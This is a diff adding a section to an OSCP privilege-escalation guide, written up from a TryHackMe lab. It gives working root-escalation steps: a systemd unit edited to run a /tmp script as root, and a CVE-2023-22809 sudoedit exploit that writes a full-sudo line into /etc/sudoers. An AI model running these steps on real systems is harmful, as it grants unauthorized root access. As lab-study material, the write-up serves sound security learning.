@@ -34,6 +34,7 @@
 14. [Checklist for OSCP](#checklist-for-oscp)
 15. [My Experience beyond this list](#My-Experience-beyond-this-list)
     - [You many miss something (suid executable) because there are too many things to look at](You-many-miss-something-(suid-executable)-because-there-are-too-many-things-to-look-at)
+    - [important things for systemctl](important-things-for-systemctl)
 17. [References](#references)
 
 ## Introduction
@@ -286,7 +287,75 @@ puts("Not an Admin")
 ```
 
 The program checked for an `admin` environment variable. If this variable existed and met certain conditions, it granted root access.
+#### systemctl
 
+From TryHackMe room [Revenge](https://tryhackme.com/r/room/revenge):
+
+After gaining an SSH shell, running `sudo -l` revealed the following:
+
+```
+Matching Defaults entries for server-admin on duckyinc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User server-admin may run the following commands on duckyinc:
+    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
+```
+
+The file permissions for `/etc/systemd/system/duckyinc.service` were:
+
+```
+-rw-r--r-- 1 root root 388 Aug 12 2020 /etc/systemd/system/duckyinc.service
+```
+
+However, it is editable using `sudoedit`.
+
+---
+
+### Method 1: Editing the File
+
+```ini
+[Unit]
+Description=Gunicorn instance to serve DuckyInc Webapp
+After=network.target
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=/var/www/duckyinc
+ExecStart=/bin/bash /tmp/ro.sh
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s TERM $MAINPID
+
+[Install]
+WantedBy=multi-user.target
+```
+
+**Note:** `User=root` and `Group=root`
+
+The script `ro.sh` can perform the necessary actions.
+
+---
+
+### Method 2: Exploiting `sudoedit`
+
+The `sudoedit` version is exploitable (CVE-2023-22809). Follow these steps:
+
+```bash
+export EDITOR="vim -- /etc/sudoers"
+sudoedit /opt/example.txt
+```
+
+Add the following line to escalate privileges:
+
+```
+john ALL=(ALL:ALL) ALL
+```
+
+Finally, gain root access:
+
+```bash
+sudo su root
+```
 ### Key Takeaway:
 Pay close attention to the output of every command and file, especially unknown ones. In this case, the best approach was to dig into files I didn’t recognize.
 
